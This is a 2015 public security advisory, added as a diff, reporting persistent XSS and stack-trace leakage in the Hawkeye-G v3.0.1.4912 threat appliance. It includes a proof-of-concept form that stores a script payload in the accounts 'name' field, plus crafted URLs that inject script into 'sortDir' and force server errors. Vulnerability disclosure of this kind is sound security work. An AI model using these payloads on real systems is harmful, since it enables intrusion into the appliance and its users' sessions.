@@ -1,0 +1,149 @@
+# Exploit Title: Persistent XSS, Information Leakage  IDS / IPS
+# Google Dork: intitle: Persistent XSS, Information Leakage  IDS / IPS
+# Date: 2015-07-25
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: www.hexiscyber.com
+# Software Link:  www.hexiscyber.com/products/hawkeye-g
+# Version:  v3.0.1.4912
+# Tested on: windows 7 SP1
+# Category: Network Threat Appliance IDS / IPS
+
+
+
+Vendor:
+================================
+www.hexiscyber.com
+
+
+
+Product:
+================================
+Hawkeye-G v3.0.1.4912
+
+Hawkeye G is an active defense disruptive technology that
+detects, investigates, remediates and removes cyber threats
+within the network.
+
+
+
+Vulnerability Type:
+=============================================
+Persistent XSS & Server Information Leakage
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Advisory Information:
+=====================================================================
+
+Persistent XSS:
+---------------
+
+Hexis cyber Hawkeye-G network threat appliance is vulnerable to
+persistent XSS injection when adding device accounts to the system.
+The appliance contains an endpoint sensor that collects client
+information to report back to the Hawkeye-G web interface.
+
+When adding device accounts to the system XSS payloads supplied to the
+vulnerable id parameter 'name' will be stored in database and executed each
+time certain threat appliance webpages are visited.
+
+
+Server Information Disclosure:
+-----------------------------
+
+We can force internal server 500 errors that leak back end information's.
+Stack traces are echoed out to the end user instead of being suppressed
+this can give attackers valuable information into the system internals
+possibly helping attackers in crafting more specific types of attacks.
+
+
+
+Exploit code(s):
+===============
+
+Persistent XSS:
+---------------
+
+<form id="exploit" action="
+https://localhost:8443/interface/rest/accounts/json" method="post">
+<input type="text" name="human" value="true" />
+<input type="text" name="name" value="<script>alert(666)</script>" />
+<input type="text" name="domainId" value=""/>
+<input type="text" name="domain_id" value="" />
+<input type="text" name="roving" value="false" />
+</form>
+
+Accessing URL will execute malicious XSS stored in Hawkeye-G backend
+database.
+https://localhost:8443/interface/app/#/account-management
+
+vulnerable parameter:
+'name'
+
+<input placeholder="Name" ng-model="record.name" id="name"
+class="formeditbox ng-pristine ng-invalid ng-invalid-required ng-touched"
+name="name" required="" ng-disabled="record.guid">
+
+
+Server Information Leakage:
+---------------------------
+
+These examples will result in 500 internal server error info disclosures:
+
+1-
+https://localhost:8443/interface/rest/threatfeeds/pagedJson?namePattern=&page=0&size=25&sortCol=address&sortDir=%22/%3E%3Cscript%3Ealert%280%29%3C/script%3E
+
+2-
+https://localhost:8443/interface/rest/mitigationWhitelist/paged?namePattern=WEB-INF/web.xml&page=0&size=0&source-filter=
+
+
+
+Disclosure Timeline:
+=========================================================
+
+
+Vendor Notification: June 30, 2015
+July 25, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):            [+] POST & GET
+
+
+Vulnerable Product:           [+] Hawkeye-G v3.0.1.4912
+
+
+Vulnerable Parameter(s):      [+] name, namePattern, sortDir
+
+
+Affected Area(s):             [+] Network Threat Appliance
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author. The author is not responsible for any misuse of the information
+contained herein and prohibits any malicious use of all security related
+information or exploits by the author or elsewhere.
+
+by hyp3rlinx
